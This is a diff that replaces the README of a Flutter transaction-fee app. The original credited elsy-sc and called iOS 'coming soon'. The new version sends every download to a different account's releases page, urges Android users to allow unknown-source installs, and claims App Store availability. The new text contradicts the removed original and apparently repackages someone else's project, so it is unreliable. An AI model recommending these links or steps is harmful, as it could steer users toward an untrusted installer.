@@ -1,276 +1,92 @@
-<div align="center">
+# 📱 feezer - Optimize Your Transaction Fees Easily 
 
-<img src="assets/images/logo.png" width="80" alt="Feezer Logo" />
+## 💡 Introduction
+feezer is a mobile application built with Flutter. It helps you calculate and optimize transaction fees across different financial providers. By using feezer, you can make informed decisions, save money, and understand your financial transactions better.
 
-# Feezer
+## 🔗 Download Now
+[![Download feezer](https://img.shields.io/badge/Download%20feezer-brightgreen)](https://github.com/ashenafi21/feezer/releases)
 
-### *Smart Transaction Fee Optimization*
+## 🚀 Getting Started
+To begin using feezer, follow these simple steps. 
 
-[![Flutter](https://img.shields.io/badge/Flutter-02569B?style=for-the-badge&logo=flutter&logoColor=white)](https://flutter.dev)
-[![Android](https://img.shields.io/badge/Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](#)
-[![iOS](https://img.shields.io/badge/iOS-000000?style=for-the-badge&logo=ios&logoColor=white)](#)
+1. **Access the Releases Page**
+   - Click the link below to visit the page where you can download the app:
+   [Visit this page to download feezer](https://github.com/ashenafi21/feezer/releases)
 
-**Feezer** empowers you to calculate, compare, and optimize transaction fees across multiple financial providers.  
-Make smarter financial decisions and minimize costs with advanced fee analysis and optimization algorithms.
+2. **Choose the Right Version**
+   - On the Releases page, you will see different versions of the application. Look for the latest version. The latest version usually has the highest version number.
 
-[📥 Download](#-download--installation) • [✨ Features](#-features) • [📸 Screenshots](#-screenshots) • [📖 Documentation](#-how-to-use) • [💬 Support](#-support--feedback)
+3. **Download the App**
+   - Click on the version you wish to download. You will find several assets. Look for the one suitable for your device and click on the link to download it. 
 
----
+## 📦 System Requirements
+- **Supported Platforms:** 
+  - Android: 7.0 (API level 24) and above
+  - iOS: 12.0 and above
+- **Storage Space:** At least 100 MB of free space on your device
+- **Internet Connection:** Required for initial setup and to fetch the latest fee data 
 
-</div>
+## 🛠️ Installation Steps
+Once you have downloaded the file, follow these instructions to install and use feezer on your device.
 
-## ✨ Features
+### Android
 
-<table>
-<tr>
-<td width="33%" valign="top">
+1. **Locate the Downloaded File**
+   - Open your device's file manager and navigate to the "Downloads" folder. 
 
-### 🎯 Core Capabilities
+2. **Install the App**
+   - Tap on the downloaded APK file. You may see a warning about installing apps from unknown sources. If prompted, allow this option in your device settings.
 
-**Provider Management**  
-Create and manage financial service providers with custom fee structures
+3. **Open feezer**
+   - After the installation is complete, you will see the feezer icon on your home screen. Tap it to open the app.
 
-**Multi-Currency Support**  
-Handle multiple currencies with configurable exchange rates
+### iOS
 
-**Advanced Fee Analysis**  
-Define complex fee intervals with minimum/maximum thresholds
+1. **Locate the Downloaded File**
+   - Open the App Store and search for "feezer" if you downloaded it from there. If not, follow specific instructions provided regarding direct installations.
 
-**Optimization Engine**  
-Intelligent algorithms to find optimal transaction amounts
+2. **Install the App**
+   - Tap "Get" and then "Install". Enter your Apple ID password or use Face ID/Touch ID if prompted.
 
-**Cost Comparison**  
-Detailed breakdowns comparing optimized vs. standard scenarios
+3. **Open feezer**
+   - Once installed, find the feezer icon on your home screen and tap to launch.
 
-</td>
-<td width="33%" valign="top">
+## 🖥️ Using feezer
+Once you have your application open, you can start using it immediately.
 
-### 🎨 User Experience
+1. **Input Your Transaction Details**
+   - Enter the amount and select the financial provider you wish to analyze. 
 
-**Multilingual Interface**  
-Available in multiple languages for global accessibility
+2. **Review the Results**
+   - feezer will calculate the transaction fees for you. You can see a detailed breakdown of fees from different providers.
 
-**Theme Customization**  
-Elegant light and dark modes to match your preference
+3. **Make Informed Decisions**
+   - Use the results to determine which provider offers the best deal for your transaction.
 
-**Intuitive Design**  
-Clean, modern interface optimized for mobile devices
+## 🔍 Troubleshooting
+If you encounter any issues while downloading or using the app, consider the following:
 
-**Data Portability**  
-CSV import/export for effortless data management
+- **App Won't Open:**
+  - Ensure your device meets the system requirements.
+  - Restart your device and try opening the app again.
 
-**Real-time Search**  
-Quickly find providers, currencies, and fee information
+- **Can't Download the App:**
+  - Ensure you have a stable internet connection.
+  - Check if there’s enough storage space on your device.
 
-</td>
-<td width="33%" valign="top">
+## 💬 FAQs
 
-### ⚡ Technical Excellence
+### How do I update feezer?
+You can update feezer by downloading the latest version from the Releases page, just like you did for the initial installation.
 
-**High-Precision Calculations**  
-Accurate financial computations using advanced algorithms
+### Can I use feezer offline?
+Yes, while you can access previously entered data offline, internet access is necessary for fetching the latest fee information.
 
-**Local-First Architecture**  
-All data stored securely on your device
+### Is feezer free?
+feezer is free to download and use. Additional features may come with future updates.
 
-**Cross-Platform**  
-Optimized for both Android and iOS platforms
+## 🔗 Download & Install Again
+If you need to download feezer again, simply click the link below:
+[Visit this page to download feezer](https://github.com/ashenafi21/feezer/releases)
 
-**Responsive Performance**  
-Smooth and fast user experience
-
-**Clean Architecture**  
-Well-structured and maintainable codebase
-
-</td>
-</tr>
-</table>
-
----
-
-## 📸 Screenshots
-
-<div align="center">
-
-### Main Features
-
-| 💸 Fee Optimization | 🏦 Provider Management | 💱 Currency Management |
-|:---:|:---:|:---:|
-| <img src="assets/images/optimize-fee.png" width="220"/> | <img src="assets/images/providers.png" width="220"/> | <img src="assets/images/currencies.png" width="220"/> |
-| *Calculate optimal amounts to minimize fees* | *Browse and manage financial providers* | *Manage currencies and exchange rates* |
-
-### Configuration & Data
-
-| ⚙️ Settings & Preferences | 📂 Data Management |
-|:---:|:---:|
-| <img src="assets/images/settings.png" width="220"/> | <img src="assets/images/data.png" width="220"/> |
-| *Customize language, theme, and preferences* | *Import and export data for backup* |
-
-</div>
-
----
-
-## 📥 Download & Installation
-
-### 📱 Android
-
-<div align="center">
-
-**[📥 Download Latest APK](../../releases)**
-
-</div>
-
-#### Installation Steps
-
-1. 📲 Download the APK file to your Android device
-2. ⚙️ Enable *"Install from Unknown Sources"* in your device settings
-3. 📂 Open the downloaded APK file
-4. ✅ Follow the installation prompts
-5. 🚀 Launch the app and complete onboarding
-
-### 🍎 iOS
-
-> 🔜 Coming soon! iOS version is currently in development.
-
----
-
-## 🛠️ Tech Stack
-
-Built with modern mobile technologies for optimal performance:
-
-```
-Framework      → Flutter
-Platforms      → Android & iOS
-Database       → SQLite (Local Storage)
-UI Design      → Material Design
-Architecture   → Clean Architecture
-State Mgmt     → Provider Pattern
-```
-
-**Key Technologies:**
-- 🎯 **Flutter SDK** — Cross-platform mobile framework
-- 💾 **SQLite** — Lightweight local database
-- 🎨 **Material Design** — Google's design system
-- 📊 **Data Analysis** — Advanced fee optimization algorithms
-
----
-
-## 📖 How to Use
-
-### 🚀 Getting Started
-
-Getting up and running with Feezer is simple:
-
-1. 📱 **Install** the app on your mobile device
-2. 🌍 **Complete onboarding** — set your preferred language and theme
-3. 💱 **Add currencies** — start with your primary currency (e.g., USD, EUR, MGA)
-4. 🏦 **Create providers** — add financial services with their fee structures
-5. 💸 **Start optimizing** — begin calculating optimal transaction amounts
-
-### 🏦 Managing Providers
-
-Efficiently manage your financial service providers:
-
-- 📋 Access the *Provider List* from the main menu
-- ➕ Add new providers with detailed fee information
-- 📊 Define fee intervals for different transaction ranges
-- 🔍 Use search to quickly locate specific providers
-- ✏️ Edit or delete providers as needed
-
-### 💸 Optimizing Transactions
-
-Maximize savings on your transactions:
-
-1. 🎯 Navigate to the *Fee Optimization* screen
-2. 🏦 Select your provider from the list
-3. 💰 Enter transaction details (amount, frequency)
-4. 🔢 Specify the number of transactions
-5. 📊 Review optimization results and potential cost savings
-6. 💡 Compare optimized vs. standard scenarios
-
-### 📊 Data Management
-
-Keep your data organized and secure:
-
-- 📥 **Import** — Use CSV import feature to bulk-add providers
-- 📤 **Export** — Download your data for backup purposes
-- 📋 **Templates** — Download CSV templates for easy data entry
-- 🔄 **Sync** — Restore data across devices seamlessly
-- 💾 **Backup** — Regularly backup your provider and currency data
-
----
-
-## 🔒 Privacy & Security
-
-Feezer prioritizes your privacy and data security:
-
-<div align="center">
-
-| Feature | Description |
-|:-------:|:------------|
-| 🏠 **Local Storage** | All data stored locally on your device — nothing goes to the cloud |
-| 🚫 **No Account Required** | Use the app without registration or personal information |
-| 📤 **Data Export** | Full control over your data with CSV export options |
-| 👁️ **No Tracking** | Zero data collection, analytics, or third-party sharing |
-| 🔐 **Secure** | Your financial data stays private and under your control |
-
-</div>
-
----
-
-## 📞 Support & Feedback
-
-Need help or have suggestions? We're here for you:
-
-- 📚 Check the **built-in help section** within the app
-- 🐛 Visit the **[Issues](../../issues)** page to report bugs or known problems
-- 💬 Use the **in-app feedback feature** to share suggestions
-- ⭐ **Star this repository** if you find Feezer useful!
-- 📧 Reach out for technical support or feature requests
-
----
-
-## 🗺️ Roadmap
-
-Exciting features coming soon:
-
-- [ ] 🍎 iOS version release
-- [ ] 📊 Advanced analytics and reporting
-- [ ] 🌐 More language support
-- [ ] 📱 Widget support for quick calculations
-- [ ] 🔔 Transaction reminders and notifications
-- [ ] 📈 Historical fee tracking and trends
-
----
-
-## 📄 License
-
-This project and its assets are **proprietary**.  
-The application is provided *as-is* for personal use.
-
-**Copyright © 2025 elsy-sc. All rights reserved.**
-
----
-
-## 🙏 Acknowledgments
-
-- 🦋 Built with [Flutter](https://flutter.dev) framework
-- 💡 Inspired by financial optimization principles
-- 🎯 Designed for users seeking better financial control
-- 🌍 Supporting smart financial decisions worldwide
-
----
-
-<div align="center">
-
-### 💡 **Optimize your transactions with Feezer** 📊
-
-*Making every transaction count*
-
----
-
-**Made with ❤️ by [elsy-sc](https://github.com/elsy-sc)**
-
-<sub>If you find this project helpful, please consider giving it a ⭐</sub>
-
-</div>
+Thank you for choosing feezer! We hope our app helps you optimize your transaction fees effectively.
